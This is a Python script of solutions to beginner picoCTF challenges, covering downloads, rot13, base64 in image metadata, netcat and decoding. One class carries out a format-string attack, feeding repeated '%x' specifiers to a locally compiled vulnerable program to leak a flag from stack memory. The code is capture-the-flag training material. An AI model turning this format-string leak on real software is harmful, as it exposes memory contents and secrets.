import base64
import abc
import os
import re
from typing import List

from util import bash, cat


class Challenge(abc.ABC):
    @abc.abstractmethod
    def run(self) -> None:
        pass

    @property
    def intermediate_files(self) -> List[str]:
        return []

    def __del__(self) -> None:
        for f in self.intermediate_files:
            os.remove(f)


class ObedientCat(Challenge):
    @property
    def intermediate_files(self) -> List[str]:
        return ["flag"]

    def run(self) -> None:
        # a flag in the clear
        bash(
            "wget https://mercury.picoctf.net/static/0e428b2db9788d31189329bed089ce98/flag"
        )
        cat("flag")


class Mod26(Challenge):
    def run(self) -> None:
        # rot13 encoding, only applied on [a-zA-Z]

        # Quick solution:
        # import codecs
        # print(codecs.encode(encrypted, "rot13"))

        upper = [chr(m) for m in range(ord("A"), ord("Z") + 1)]
        lower = [chr(m) for m in range(ord("a"), ord("z") + 1)]

        encrypted = "cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_hyLicInt}"

        e = [f for f in encrypted]
        out = []
        for q in e:
            if q in upper:
                new_idx = (upper.index(q) - 13) % len(upper)
                out.append(upper[new_idx])
            elif q in lower:
                new_idx = (lower.index(q) - 13) % len(lower)
                out.append(lower[new_idx])
            else:
                out.append(q)
        print("".join(out))


class PythonWrangling(Challenge):
    @property
    def intermediate_files(self) -> List[str]:
        return ["ende.py", "pw.txt", "flag.txt.en"]

    def run(self) -> None:
        for f in [
            "wget https://mercury.picoctf.net/static/325a52d249be0bd3811421eacd2c877a/ende.py",
            "wget https://mercury.picoctf.net/static/325a52d249be0bd3811421eacd2c877a/pw.txt",
            "wget https://mercury.picoctf.net/static/325a52d249be0bd3811421eacd2c877a/flag.txt.en",
        ]:
            bash(f)

        print("enter the following password below:")
        cat("pw.txt")
        bash("python3 ende.py -d flag.txt.en")


class WaveAFlag(Challenge):
    @property
    def intermediate_files(self) -> List[str]:
        return ["warm"]

    def run(self) -> None:
        bash(
            "wget https://mercury.picoctf.net/static/f95b1ee9f29d631d99073e34703a2826/warm"
        )
        bash("chmod +x warm")
        bash("./warm -h")


class Information(Challenge):
    @property
    def intermediate_files(self) -> List[str]:
        return ["cat.jpg"]

    def run(self) -> None:
        # bash command that also works
        # $ exiftool cat.jpg | grep -E License | sed -E 's/License\s+: //g' | base64 -d
        bash(
            "wget https://mercury.picoctf.net/static/e5825f58ef798fdd1af3f6013592a971/cat.jpg"
        )
        out = bash("exiftool cat.jpg", get_stdout=True)
        result = re.search(r"License\s+:\s(.*)", out)
        assert result is not None
        m = result.group(1)
        print(base64.decodebytes(bytes(m, encoding="utf-8")).decode("utf-8"))


class NiceNetCat(Challenge):
    def run(self) -> None:
        # connect to a netcat listener and read as ascii
        out = bash("nc mercury.picoctf.net 21135", get_stdout=True)
        chars = [int(o) for o in out.split("\n") if o not in (" ", "\n", "")]
        print("".join(chr(c) for c in chars))


class Transformation(Challenge):
    @property
    def intermediate_files(self) -> List[str]:
        return ["enc"]

    def run(self) -> None:
        # Hint:
        # "".join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])
        # ====
        # Quick solution:
        # print(encrypted.encode("utf-16-be"))

        bash(
            "wget https://mercury.picoctf.net/static/a757282979af14ab5ed74f0ed5e2ca95/enc"
        )
        decrypted = []

        # need to read the file in default reading mode as utf-8 variable-length decoding is quite
        # a bit of work to implement. otherwise we would have opened the file in "rb" mode.
        with open("enc", "r") as f:
            encrypted = f.read()

        # now that each variable-length character is decoded, loop through and break
        # them into 8-bit (a.k.a. nibble) chunks.
        for byt in encrypted:
            byt_int = ord(byt)
            left = chr((byt_int & 0xFF00) >> 8)
            right = chr(byt_int & 0x00FF)
            decrypted.extend([left, right])
        print("".join(decrypted))


class Stonks(Challenge):
    @property
    def intermediate_files(self) -> List[str]:
        return []
        return ["vuln.c"]

    def run(self) -> None:
        # exploit a printf() call with no format specifier, a.k.a. format string attack
        # https://owasp.org/www-community/attacks/Format_string_attack

        # bash(
        #    "wget https://mercury.picoctf.net/static/7e71fc0d8cc3339bfad6bf408f7dc510/vuln.c"
        # )
        bash("gcc -o vuln vuln.c")
        with open("api", "w") as api:
            api.write("dummy_flag_for_local_testing")

        import subprocess

        with subprocess.Popen(
            "./vuln",
            bufsize=-1,
            universal_newlines=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
        ) as p:

            stdout = p.stdout.readline()
            while "View my" not in stdout:
                stdout = p.stdout.readline()
                print(stdout)

            # select what to do, i.e. buy stonks
            p.stdin.write("1\n")

            stdout = p.stdout.readline()
            while "What is your API token?" not in stdout:
                stdout = p.stdout.readline()
                print(stdout)

            # - is chosen as vuln.c does not print - character anywhere
            delimiter = "-"
            expected_flag_length = 50
            p.stdin.write(
                delimiter.join(["%x"] * expected_flag_length)
            )
            stdout = p.stdout.readline()

            vuln_stdout_target_line = next(
                iter([line for line in stdout.split("\n") if delimiter in line])
            )
            print(vuln_stdout_target_line)
            flag = ""
            for part in vuln_stdout_target_line.split("-"):
                print(part)
                if len(part) == 8:
                    m = reversed(bytearray.fromhex(part))
                    for n in m:
                        if 32 <= n <= 128:
                            flag += " " + chr(n)
            print(flag)
        # bash("nc mercury.picoctf.net 6989")
